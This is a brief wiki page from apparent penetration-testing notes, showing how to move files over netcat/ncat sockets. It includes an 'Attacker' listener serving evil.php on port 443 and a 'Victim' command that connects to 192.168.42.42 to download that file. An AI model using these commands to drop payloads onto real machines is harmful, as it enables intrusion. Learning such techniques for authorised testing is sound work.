---
title: "Sockets"
date: 2025-10-03
draft: false
type: wiki
---

Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.
Create the socket with:

```console
Attacker:
  nc -lvnp 443 < evil.php

For both cases from windows, the only difference is to write nc.exe

Victim:
  nc -v 192.168.42.42 443 > evil.php
```

-----------------------------
